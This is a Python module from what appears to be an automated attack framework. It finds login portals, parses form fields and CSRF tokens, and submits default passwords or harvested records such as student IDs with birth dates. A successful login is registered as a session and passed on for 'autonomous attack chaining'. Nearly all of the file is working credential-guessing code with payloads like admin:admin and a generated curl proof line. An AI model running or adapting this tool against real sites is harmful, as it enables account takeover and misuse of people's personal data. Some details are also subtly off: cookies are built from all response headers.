"""Stateful Authentication & Credential Assessment Module (V15).

Performs stateful authentication auditing:
- Automatic login form detection and multi-field input mapping (username, password, nim, dob, pin, csrf tokens).
- Multi-identity credential verification with automated permutations.
- Session cookie persistence and verification of successful login state (Redirect to dashboard / Session Cookies).
- Real-time AuthenticationSucceeded event emission for autonomous attack chaining.
"""

from __future__ import annotations

import logging
import re
from typing import Any, Dict, List, Optional, Union
from urllib.parse import urlencode, urljoin, urlparse

from app.attacks.base import AttackPlan, BaseAttackModule, ValidationResult
from app.core.events import event_bus
from app.core.session_context import SessionContext, SessionIdentity
from app.orchestration.attack_opportunity import AttackOpportunity

logger = logging.getLogger("attacks.auth")


class AuthAttackModule(BaseAttackModule):
    def __init__(self) -> None:
        super().__init__(attack_type="auth", cwe_id="CWE-287", default_severity="HIGH")

    async def discover(self, target: str, context: Dict[str, Any]) -> List[AttackOpportunity]:
        opps: List[AttackOpportunity] = []
        urls = context.get("urls", [])
        for u in urls:
            if any(term in u.lower() for term in ("login", "signin", "auth", "admin", "wp-login", "user/login", "portal", "masuk")):
                opps.append(
                    AttackOpportunity(
                        target=target,
                        endpoint=u,
                        attack_type="auth",
                        hypothesis=f"Authentication portal at {u} can be assessed for weak credentials, harvested records, or bypasses.",
                        priority=88,
                    )
                )
        return opps

    async def plan(self, opportunity: AttackOpportunity) -> AttackPlan:
        return AttackPlan(
            title=f"Authentication & Credential Assessment on {opportunity.endpoint}",
            attack_type="auth",
            target=opportunity.endpoint,
            steps=[
                "1. Fetch login portal, identify input fields, and extract CSRF tokens",
                "2. Dispatch credential verification probe with session state tracking",
                "3. Verify authentication status and session persistence",
            ],
            payloads=["admin:admin", "admin:password", "test:test"],
            expected_evidence="Authenticated session cookie or redirection to protected dashboard.",
            context={"credentials": opportunity.metadata.get("credentials", [])},
        )

    async def validate(self, opportunity: AttackOpportunity, session: SessionContext) -> ValidationResult:
        endpoint = opportunity.endpoint
        creds = opportunity.metadata.get("credentials") or [("admin", "admin"), ("admin", "password123"), ("root", "root")]
        field_mapping = opportunity.metadata.get("field_mapping") or {}

        # 1. Fetch form & CSRF tokens
        form_resp = await session.get(endpoint)
        if not form_resp.is_success and not form_resp.status_code:
            return ValidationResult(
                is_vulnerable=False,
                confidence=0.0,
                proof_level="P0",
                attack_type="auth",
                target_url=endpoint,
                message="Auth endpoint unreachable.",
            )

        # Detect form input fields dynamically if not explicitly mapped
        user_field = "username"
        pass_field = "password"

        if re.search(r'name=["\'](user|email|login|user_login|usr|nim|nip|nik|id_user|no_induk|identity)["\']', form_resp.text, re.I):
            m = re.search(r'name=["\'](user|email|login|user_login|usr|nim|nip|nik|id_user|no_induk|identity)["\']', form_resp.text, re.I)
            if m:
                user_field = m.group(1)

        if re.search(r'name=["\'](pass|password|pwd|user_pass|tanggal_lahir|tgl_lahir|dob|birthdate|pin|secret)["\']', form_resp.text, re.I):
            m = re.search(r'name=["\'](pass|password|pwd|user_pass|tanggal_lahir|tgl_lahir|dob|birthdate|pin|secret)["\']', form_resp.text, re.I)
            if m:
                pass_field = m.group(1)

        # Collect hidden fields and action from form
        hidden_fields: Dict[str, str] = {}
        for m_input in re.finditer(r'<input[^>]+name=["\']([^"\']+)["\'][^>]+value=["\']([^"\']*)["\']', form_resp.text, re.I):
            k, v = m_input.group(1), m_input.group(2)
            if k.lower() not in (user_field.lower(), pass_field.lower(), "submit", "btn"):
                hidden_fields[k] = v

        for cred in creds:
            data: Dict[str, str] = dict(hidden_fields)
            cred_dict: Dict[str, str] = {}

            if isinstance(cred, (list, tuple)) and len(cred) == 2:
                username, password = str(cred[0]), str(cred[1])
                data[user_field] = username
                data[pass_field] = password
                cred_dict = {user_field: username, pass_field: password}
            elif isinstance(cred, dict):
                # Arbitrary dictionary of form fields (e.g. {"nim": "531420001", "tanggal_lahir": "1998-05-12"})
                for k, v in cred.items():
                    data[k] = str(v)
                    cred_dict[k] = str(v)
                username = next(iter(cred.values()), "user")
                password = next(itertools.islice(cred.values(), 1, None), "") if len(cred) > 1 else ""
            else:
                continue

            auth_resp = await session.post(endpoint, data=data)

            # Check for successful authentication signals:
            # - Session cookies set (sessionid, auth_token, PHPSESSID, token, etc.)
            # - Status 302/303 redirect to /dashboard, /admin, /home, /profile, /kuesioner
            # - "Welcome", "Dashboard", "Logout", "Sign Out", "Profil", "Berhasil" in response text
            is_auth_success = False
            redirect_loc = auth_resp.headers.get("location", "")

            if auth_resp.status_code in (302, 303):
                loc = redirect_loc.lower()
                if not any(k in loc for k in ("login", "signin", "error", "failed", "gagal")):
                    is_auth_success = True
            elif auth_resp.status_code == 200:
                body_lower = auth_resp.text.lower()
                if any(w in body_lower for w in ("logout", "sign out", "dashboard", "logged in as", "selamat datang", "profil", "kuesioner")) and not any(f in body_lower for f in ("invalid credentials", "gagal login", "salah", "failed")):
                    is_auth_success = True

            if is_auth_success:
                user_display = username or next(iter(cred_dict.values()), "authenticated_user")
                role = "admin" if any(adm in user_display.lower() or adm in endpoint.lower() for adm in ("admin", "root")) else "user"
                
                # Combine cookies from response and session
                active_cookies = dict(auth_resp.headers)
                if hasattr(session, "get_active_identity"):
                    active_cookies.update(session.get_active_identity().cookies)

                # Register authenticated identity in session context
                session.register_identity(
                    SessionIdentity(
                        id="authenticated_session",
                        name=f"Authenticated ({user_display})",
                        role=role,
                        cookies=active_cookies,
                        metadata={"credentials": cred_dict, "auth_url": endpoint},
                    )
                )
                session.switch_identity("authenticated_session")

                # Emit real-time event for autonomous chaining
                await event_bus.publish({
                    "type": "AuthenticationSucceeded",
                    "target_url": endpoint,
                    "endpoint": endpoint,
                    "credentials": cred_dict,
                    "identity_id": "authenticated_session",
                    "role": role,
                    "cookies": active_cookies,
                    "redirect_location": redirect_loc,
                })

                poc_params = urlencode(cred_dict)
                poc_curl = f"curl -s -k -X POST '{endpoint}' -d '{poc_params}'"

                return ValidationResult(
                    is_vulnerable=True,
                    confidence=0.98,
                    proof_level="P4",
                    attack_type="auth",
                    target_url=endpoint,
                    baseline_status=form_resp.status_code,
                    exploit_status=auth_resp.status_code,
                    evidence={
                        "valid_credentials": cred_dict,
                        "redirect_location": redirect_loc,
                        "response_sample": auth_resp.text[:300],
                        "session_identity": "authenticated_session",
                        "role": role,
                    },
                    exploitation_data={
                        "session_acquired": True,
                        "role": role,
                        "identity_name": user_display,
                        "credentials": cred_dict,
                    },
                    poc_curl=poc_curl,
                    message=f"CRITICAL: Valid authentication confirmed on {endpoint} using {cred_dict}",
                    cwe_id="CWE-287",
                    severity="CRITICAL" if role == "admin" else "HIGH",
                )

        return ValidationResult(
            is_vulnerable=False,
            confidence=0.2,
            proof_level="P0",
            attack_type="auth",
            target_url=endpoint,
            baseline_status=form_resp.status_code,
            message="No default or harvested credentials succeeded on authentication portal.",
        )


import itertools
